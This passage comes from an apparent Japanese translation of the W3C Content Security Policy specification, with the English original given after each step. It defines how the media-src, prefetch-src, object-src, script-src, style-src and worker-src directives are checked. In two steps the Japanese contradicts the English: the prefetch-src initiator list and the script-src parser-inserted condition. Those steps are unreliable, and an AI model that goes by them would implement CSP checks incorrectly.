( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN { `audio^l, `video^l, `track^l }
］：
◎
If request’s destination is one of "audio", "video", or "track":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="media-src-post-request">
<h5 title="media-src Post-request check">6.1.8.2. `media-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN { `audio^l, `video^l, `track^l }
］：
◎
If request’s destination is one of "audio", "video", or "track":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-prefetch-src">
<h4 title="prefetch-src">6.1.9. `prefetch-src^dir</h4>

<p>
`prefetch-src@dir
指令は、［
どの~URLから資源を
~prefetch ／ ~prerender
してよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The prefetch-src directive restricts the URLs from which resources may be prefetched or prerendered. The syntax for the directive’s name and value is described by the following ABNF:
</p>


<pre class="ABNF">
`directive-name$p  = "prefetch-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre>
Content-Security-Policy: `prefetch-src$dir https://example.com/</pre>


<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`prefetch-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return network errors, as the URLs provided do not match prefetch-src's source list:
</p>

<pre class="html-code">
&lt;link rel="prefetch" src="https://example.org/"&gt;&lt;/link&gt;
&lt;link rel="prerender" src="https://example.org/"&gt;&lt;/link&gt;
</pre>

</div>



				<section id="prefetch-src-pre-request">
<h5 title="prefetch-src Pre-request check ">6.1.9.1.  `prefetch-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`起動元$rq ~IN { `fetch^l, `prerender^l }
］：
◎
If request’s initiator is "prefetch" or "prerender":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="prefetch-src-post-request">
<h5 title="prefetch-src Post-request check ">6.1.9.2. `prefetch-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`起動元$rq ~IN { `fetch^l, `prerender^l }
］：
◎
If request’s initiator is "prefetch" or "prerender":
</p>

		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
			</section>
			<section id="directive-object-src">
<h4>6.1.10. `object-src^dir</h4>

<p>
`object-src@dir
指令は、［
どの~URLから~plugin内容を読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The object-src directive restricts the URLs from which plugin content may be loaded. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "object-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `object-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`object-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match object-src's source list:
</p>

<pre class="html-code">
&lt;embed src="https://example.org/flash"&gt;&lt;/embed&gt;
&lt;object data="https://example.org/flash"&gt;&lt;/object&gt;
&lt;applet archive="https://example.org/flash"&gt;&lt;/applet&gt;
</pre>
</div>

<p>
~URLを伴わない~pluginにより内容が読込まれる場合（おそらく、 `object$e 要素は `data$a 属性を欠いていて，指定された `type^a に基づいて何らかの既定~pluginを読込もうとしている）、
`object-src$dir の値が `none$pl ならば，阻止され~MUST
— 他の場合、許容されることになる。
◎
If plugin content is loaded without an associated URL (perhaps an object element lacks a data attribute, but loads some default plugin based on the specified type), it MUST be blocked if object-src's value is 'none', but will otherwise be allowed.
</p>

<p class="note">注記：
`object-src$dir 指令は、［
`object$e ／ `embed$e ／ `applet$e
］要素がそれ自身のために発行する どの要請に対しても動作する。
これには、前者の二つ（~naviも含む）により生成される
`入子の閲覧文脈$を拡充させるような要請も含まれる。
このことは、［
MIME 型が `text/html^c であるような `object$e 要素
］など，~dataが［
さもなければ別の指令により制約されるような内容
］に意味論的に等価であるときにも該当する。
◎
Note: The object-src directive acts upon any request made on behalf of an object, embed, or applet element. This includes requests which would populate the nested browsing context generated by the former two (also including navigations). This is true even when the data is semantically equivalent to content which would otherwise be restricted by another directive, such as an object element with a text/html MIME type.
</p>

<p class="note">注記：
~plugin資源へ直に~navigateされるとき（すなわち、`閲覧文脈$内の`~plugin文書$として
<!-- ~top-level閲覧文脈や入子の閲覧文脈 -->
— `embed$e ／ `object$e ／ `applet$e を介して下位資源として埋込まれるものでない）、その資源に伴って送達された`施策$は，その`~plugin文書$に適用されることになる。
よって開発者は、具体的には，応答に 施策 `object-src 'none'^dir を伴わせて送達することにより、~pluginを内容とする任意の資源の実行を防止できることになる。
これにより、力を備えた~plugin（および Flash その他がときに呈する， “面白い” 保安~model）がある下でも，
<a href="https://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/">Rosetta Flash</a>
の様な攻撃手法の~riskを軽減できるようになる。
◎
Note: When a plugin resource is navigated to directly (that is, as a plugin document in the top-level browsing context or a nested browsing context, and not as an embedded subresource via embed, object, or applet), any policy delivered along with that resource will be applied to the plugin document. This means, for instance, that developers can prevent the execution of arbitrary resources as plugin content by delivering the policy object-src 'none' along with a response. Given plugins' power (and the sometimes-interesting security model presented by Flash and others), this could mitigate the risk of attack vectors like Rosetta Flash.
</p>

				<section id="object-src-pre-request">
<h5 title="object-src Pre-request check">6.1.10.1. `object-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN { `object^l, `embed^l }
］：
◎
If request’s destination is "object" or "embed":
</p>
		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="object-src-post-request">
<h5 title="object-src Post-request check">6.1.10.2. `object-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN { `object^l, `embed^l }
］：
◎
If request’s destination is "object" or "embed":
</p>
		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
			</section>
			<section id="directive-script-src">
<h4>6.1.11. `script-src^dir</h4>

<p>
`script-src@dir
指令は、［
どの所在からの~scriptを実行してよいか
］を制約する。
これには、［
`script$e 要素の中に直に読込まれる~URL
］のみならず，［
~inline~script~blockや XSLT ~stylesheet `XSLT$r の様な，~script実行を誘発し得るもの
］も含まれる。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The script-src directive restricts the locations from which scripts may be executed. This includes not only URLs loaded directly into script elements, but also things like inline script blocks and XSLT stylesheets [XSLT] which can trigger script execution. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "script-src"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
`script-src$dir
指令は、次について統治する：
◎
The script-src directive governs five things:
</p>

<ul>
	<li>
~script`要請$は、
`要請は~CSPにより阻止されるべきか？$A
に合格し~MUST。
◎
Script requests MUST pass through §4.1.3 Should request be blocked by Content Security Policy?.
</li>
	<li>
~script`応答$は、
`要請に対する応答は~CSPにより阻止されるべきか？$A
に合格し~MUST。
◎
Script responses MUST pass through §4.1.4 Should response to request be blocked by Content Security Policy?.
</li>
	<li>
<p >
~inline `script$e 要素~blockは、
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$A
に合格し~MUST。
その挙動は、どの施策も 次のいずれかにより~inline~scriptを許容していない限り，阻止されることになる：
</p>

<ul ><li>`script-src$dir （または `default-src$dir ）指令を指定しないことにより、暗黙的に。
</li><li>その~inline~blockに合致する［
`unsafe-inline$pl ／
`nonce-source$p ／
`hash-source$p
］を，明示的に指定することにより。
</li></ul>

◎
Inline script blocks MUST pass through §4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?. Their behavior will be blocked unless every policy allows inline script, either implicitly by not specifying a script-src (or default-src) directive, or explicitly, by specifying "unsafe-inline", a nonce-source or a hash-source that matches the inline block.
</li>
	<li>
<p>
次の~JS実行~sink†は、
`unsafe-eval$pl ~source式で通過制御される：
◎
The following JavaScript execution sinks are gated on the "unsafe-eval" source expression:
</p>
		<ul>
			<li>
`eval()$c
◎
eval()
</li>
			<li>
`Function()$c
◎
Function()
</li>
			<li>
第一~引数は~callableでない，
`setTimeout()$m
◎
setTimeout() with an initial argument which is not callable.
</li>
			<li>
第一~引数は~callableでない，
`setInterval()$m
◎
setInterval() with an initial argument which is not callable.
</li>
	</ul>
<!-- 
~callable
Iscallable
-->

<p class="note">注記：
`setImmediate()^m や `execScript()^m
の様な非~標準~sinkを実装する~UAは、それらも
`unsafe-eval$pl 上で通過制御する~SHOULDである。
◎
Note: If a user agent implements non-standard sinks like setImmediate() or execScript(), they SHOULD also be gated on "unsafe-eval".
</p>

<p class="trans-note">【†
保安~文脈における~sink（ “槽” ）とは、~data~flowにおいて，最初に~app層に渡される，外部からの信用できない~data源を意味する（
<a href="https://code.google.com/p/domxsswiki/wiki/Sinks" >参考</a>
）。
実行~sink（ `execution sink^en ）とは、~scriptの~sourceとして構文解析された上で実行され得る（したがって脆弱性の源になり得る）ような文字列~data源となる~sinkを意味する。
】</p>

	</li>
	<li>
`javascript_^sc ~URLへの~naviは、
<a href="#script-src-inline">`script-src^dir ~inline検査</a>
に合格し~MUST。
◎
Navigation to javascript: URLs MUST pass through §6.1.11.3 script-src Inline Check.
</li>
</ul>


				<section id="script-src-pre-request">
<h5 title="script-src Pre-request check">6.1.11.1. `script-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~IF［
%要請 に対する`有効な指令を取得-$Aした結果 ~EQ `worker-src$dir
］~AND［
%施策 内に［
`名前$ ~IN { `worker-src^l, `child-src^l }
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.11 Get the effective directive for request on request is "worker-src", and policy contains a directive whose name is "worker-src" or a directive whose name is "child-src", return "Allowed".
</li>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%要請 の`行先$rqは`~scriptに類する$
］：
◎
If request’s destination is script-like:
</p>
		<ol>
			<li>
~IF［
`~nonceは~source~listに合致するか？$A( %要請 の`暗号用~nonce~metadata$rq, %~list )
~EQ `合致es^i
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.2 Does nonce match source list? on request’s cryptographic nonce metadata and this directive’s value is "Matches", return "Allowed".
</li>
			<li>
<p>
~IF［
%~list 内に［
`hash-source$p 文法に合致するような `~source式$
］がある
］：
◎
Let integrity expressions be the set of source expressions in this directive’s value that match the hash-source grammar.
◎
If integrity expressions is not empty:
</p>

				<ol>
					<li>
%完全性~sourceたち ~LET
%要請 の`完全性~metadata$rqを渡して，`~metadataを構文解析-$した結果
`SRI$r
◎
Let integrity sources be the result of executing the algorithm defined in Subresource Integrity §parse-metadata on request’s integrity metadata. [SRI]
</li>
					<li>
<p>
~IF［
次のすべてが満たされる
］…：
</p>

<ul><li>%完全性~sourceたち ~NEQ `~metadataなし^i
</li><li>%完全性~sourceたち は空でない
</li><li>%完全性~sourceたち 内のどの %~source に対しても，［
次の両者を満たす `~source式$ %式
］が %~list 内にある：

	<ul ><li>%~source の `hash-algo^P 成分 ~EQ %式 の `hash-algorithm$p 成分
	</li><li>%~source の `base64-value^P 成分 ~EQ %式 の `base64-value$p 成分
	</li></ul>
</li></ul>

<p>
…ならば
⇒
~RET `許容ed^i
</p>

◎
If integrity sources is "no metadata" or an empty set, skip the remaining substeps.
◎
Let bypass due to integrity match be true.
◎
For each source in integrity sources:
◎
If this directive’s value does not contain a source expression whose hash-algorithm is a case-sensitive match for source’s hash-algo component, and whose base64-value is a case-sensitive match for source’s base64-value, then set bypass due to integrity match to false.
◎
If bypass due to integrity match is true, return "Allowed".
</li>
				</ol>

<p class="note">注記：
ここで検証0するのは、［
%要請 の`完全性~metadata$rqで与えられる~metadataの集合
］が［
この指令が指定する `hash-source$p `~source式$たちの集合
］に包含されているかどうかまでである。
これは、応答において合致しない資源を阻止するときに，~browserによる Subresource Integrity `SRI$r の施行に依拠している。
◎
Note: Here, we verify only that the request contains a set of integrity metadata which is a subset of the hash-source source expressions specified by this directive. We rely on the browser’s enforcement of Subresource Integrity [SRI] to block non-matching resources upon response.
</p>

			</li>
			<li>
<p>
~IF［
%~list は［
`~source式$ ~EQ`~ACI$ `strict-dynamic$pl
］を包含する
］：
◎
If this directive’s value contains a source expression that is an ASCII case-insensitive match for the "'strict-dynamic'" keyword-source:
</p>

				<ol>
					<li>
<p>
~IF［
%要請 の`構文解析器~metadata$rq ~EQ `parser-inserted$l
］
⇒
~RET `阻止ed^i
◎
If the request’s parser metadata is "parser-inserted", return "Blocked".
</p>

<p>
~ELSE
⇒
~RET `許容ed^i
◎
Otherwise, return "Allowed".
</p>

<p class="note">注記：
`strict-dynamic$pl についての詳細は~strict-dynamic-usageに。
◎
Note: "'strict-dynamic'" is explained in more detail in §8.2 Usage of "'strict-dynamic'".
</p>

					</li>
				</ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="script-src-post-request">
<h5 title="script-src Post-request check">6.1.11.2. `script-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~IF［
%要請 に対する`有効な指令を取得-$Aした結果 ~EQ `worker-src$dir
］~AND［
%施策 内に［
`名前$ ~IN { `worker-src^l, `child-src^l }
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.11 Get the effective directive for request on request is "worker-src", and policy contains a directive whose name is "worker-src" or a directive whose name is "child-src", return "Allowed".
</li>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%要請 の`行先$rqは`~scriptに類する$
］：
◎
If request’s destination is script-like:
</p>
		<ol>
			<li>
~IF［
`~nonceは~source~listに合致するか？$A( %要請 の`暗号用~nonce~metadata$rq, %~list )
~EQ `合致es^i
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.2 Does nonce match source list? on request’s cryptographic nonce metadata and this directive’s value is "Matches", return "Allowed".
</li>
			<li>
~IF［
%~list 内に `strict-dynamic$pl がある
］~AND［
%要請 の`構文解析器~metadata$rq ~EQ `parser-inserted$l
］
⇒
~RET `許容ed^i
◎
If this directive’s value contains "'strict-dynamic'", and request’s parser metadata is not "parser-inserted", return "Allowed".
</li>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="script-src-inline">
<h5 title="script-src Inline Check">6.1.11.3. `script-src^dir ~inline検査</h5>

<p>
次の~algoが、この指令の`~inline検査$Aを与える：
◎
This directive’s inline check algorithm is as follows:
</p>

<p>
所与の
( `要素$ %要素, 文字列 %型, 文字列 %~source )
に対し：
◎
Given an Element (element), a string (type), and a string (source):
</p>

<ol>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%型 ~IN { `script^l, `script attribute^l, `navigation^l }
］：
◎
If type is "script", "script attribute" or "navigation":
</p>
		<ol>
			<li>
~Assert：
［
%要素 ~NEQ ~NULL
］~OR［
%型 ~EQ `navigation^l
］
◎
Assert: element is not null or type is "navigation".
</li>
			<li>
~IF［
`要素 は ( 型, ~source ) について~source~listに合致するか？$A( %要素, %~list, %型, %~source )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.2.3 Does element match source list for type and source? on element, this directive’s value, type, and source, is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
			<section id="directive-style-src">
<h4>6.1.12. `style-src^dir</h4>

<p>
`style-src@dir
指令は、［
どの所在からの~styleを`文書$に適用してよいかどうか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The style-src directive restricts the locations from which style may be applied to a Document. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "style-src"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
`style-src$dir 指令は、次について統治する：
◎
The style-src directive governs several things:
</p>

<ul>
	<li>
<p>
~style`要請$は、
`要請は~CSPにより阻止されるべきか？$A
に合格し~MUST。
これには、次のものが含まれる：
◎
Style requests MUST pass through §4.1.3 Should request be blocked by Content Security Policy?. This includes:
</p>
		<ul>
			<li>
`link$e 要素から生じている~stylesheet要請
◎
Stylesheet requests originating from a link element.
</li>
			<li>
`~at_import$ 規則から生じている~stylesheet要請
◎
Stylesheet requests originating from the @import rule.
</li>
			<li>
`Link$h ~HTTP応答~headerから生じている~stylesheet要請
`RFC8288$r
◎
Stylesheet requests originating from a Link HTTP response header field [RFC8288].
</li>
		</ul>
	</li>
	<li>
~style要請に対する`応答$は、
`要請に対する応答は~CSPにより阻止されるべきか？$A
に合格し~MUST。
◎
Responses to style requests MUST pass through §4.1.4 Should response to request be blocked by Content Security Policy?.
</li>
	<li>
<p>
~inline `style$e 要素~blockは、
`要素における~inline型の挙動は~CSPにより阻止されるべきか？$A
に合格し~MUST。
その~styleは、どの施策も 次のいずれかにより~inline~styleを許容していない限り，阻止されることになる：
</p>

		<ul>
			<li>
`style-src$dir （または `default-src$dir ）指令を指定しないことにより、暗黙的に。
</li>
			<li>
その~inline~blockに合致する［
`unsafe-inline$pl ／
`nonce-source$p ／
`hash-source$p
］を指定することにより，明示的に。
</li>
</ul>

◎
Inline style blocks MUST pass through §4.2.4 Should element’s inline type behavior be blocked by Content Security Policy?. The styles will be blocked unless every policy allows inline style, either implicitly by not specifying a style-src (or default-src) directive, or explicitly, by specifying "unsafe-inline", a nonce-source or a hash-source that matches the inline block.
</li>
	<li>
<p>
次の~CSS~algoは、 `unsafe-eval$pl ~source式で通過制御される：
◎
The following CSS algorithms are gated on the unsafe-eval source expression:
</p>
		<ul>
			<li>
`~CSS規則を挿入する$
◎
insert a CSS rule
</li>
			<li>
`~CSS規則として構文解析する$
◎
parse a CSS rule,
</li>
			<li>
`~CSS宣言~blockを構文解析する$
◎
parse a CSS declaration block
</li>
			<li>
`選択子~listとして構文解析する$
◎
parse a group of selectors
</li>
	</ul>

<p>
これには、例えば， CSSOM の各種~interface上の［
`cssText^m 設定子 ／ `insertRule()^m ~method
］に対する すべての呼出が含まれることになる。
`CSSOM$r `HTML$r
◎
This would include, for example, all invocations of CSSOM’s various cssText setters and insertRule methods [CSSOM] [HTML].
</p>

<p class="issue">
これは、もっと良く説明される必要がある。
`212$Issue
◎
This needs to be better explained. &lt;https://github.com/w3c/webappsec-csp/issues/212&gt;
</p>
	</li>
</ul>


				<section id="style-src-pre-request">
<h5 title="style-src Pre-request Check">6.1.12.1. `style-src^dir 要請前~検査</h5>

<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `style^l
］：
◎
If request’s destination is "style":
</p>

		<ol>
			<li>
~IF［
`~nonceは~source~listに合致するか？$A( %要請 の`暗号用~nonce~metadata$rq, %~list )
~EQ `合致es^i
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.2 Does nonce match source list? on request’s cryptographic nonce metadata and this directive’s value is "Matches", return "Allowed".
</li>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="style-src-post-request">
<h5 title="style-src Post-request Check">6.1.12.2. `style-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~EQ `style^l
］：
◎
If request’s destination is "style":
</p>

		<ol>
			<li>
~IF［
`~nonceは~source~listに合致するか？$A( %要請 の`暗号用~nonce~metadata$rq, %~list )
~EQ `合致es^i
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.2 Does nonce match source list? on request’s cryptographic nonce metadata and this directive’s value is "Matches", return "Allowed".
</li>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="style-src-inline">
<h5 title="style-src Inline Check">6.1.12.3. `style-src^dir ~inline検査</h5>

<p>
次の~algoが、この指令の`~inline検査$Aを与える：
◎
This directive’s inline check algorithm is as follows:
</p>

<p>
所与の
( `要素$ %要素, 文字列 %型, 文字列 %~source )
に対し：
◎
Given an Element (element), a string (type), and a string (source):
</p>

<ol>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%型 ~IN { `style^l, `style attribute^l }
］：
◎
If type is "style" or "style attribute":
</p>
		<ol>
			<li>
~IF［
`要素 は ( 型, ~source ) について~source~listに合致するか？$A( %要素, %~list, %型, %~source )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.2.3 Does element match source list for type and source? on element, this directive’s value, type, and source, is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
				<section id="style-src-init">
<h5 title="style-src Initialization">6.1.12.4. `style-src^dir 初期化</h5>

<p>
次の~algoが、この指令の`初期化$Aを与える：
◎
This directive’s initialization algorithm is as follows:
</p>

<ol>
	<li>
<p class="issue">
CSSOM の~algoを監禁するために，実行~文脈に関わる何かをする。
CSSOM がこのための~hookを与えることは見込めないので、
<!-- ＊ -->
`let’s work with them to put something reasonable together.^en
◎
Do something interesting to the execution context in order to lock down interesting CSSOM algorithms. I don’t think CSSOM gives us any hooks here, so let’s work with them to put something reasonable together.
</p>
	</li>
</ol>

				</section>
			</section>
			<section id="directive-worker-src">
<h4>6.1.13. `worker-src^dir</h4>

<p>
`worker-src@dir
指令は、［
どの~URLを［
`Worker$I ／ `SharedWorker$I ／ `ServiceWorker$I
］として読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The worker-src directive restricts the URLs which may be loaded as a Worker, SharedWorker, or ServiceWorker. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "worker-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `worker-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`worker-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match worker-src's source list:
</p>


<pre class="html-code">
&lt;script&gt;
  var blockedWorker = new Worker("data:application/javascript,...");
  blockedWorker = new SharedWorker("https://example.org/");
  navigator.serviceWorker.register('https://example.org/sw.js');
&lt;/script&gt;
</pre>

</div>

				<section id="worker-src-pre-request">
<h5 title="worker-src Pre-request Check">6.1.13.1. `worker-src^dir 要請前~検査</h5>


<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>


<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN
{ `serviceworker^l, `sharedworker^l, `worker^l }
］：
◎
If request’s destination is one of "serviceworker", "sharedworker", or "worker":
</p>

		<ol><!-- ＊ start="4"？ -->
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="worker-src-post-request">
<h5 title="worker-src Post-request Check">6.1.13.2. `worker-src^dir 要請後~検査</h5>
<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
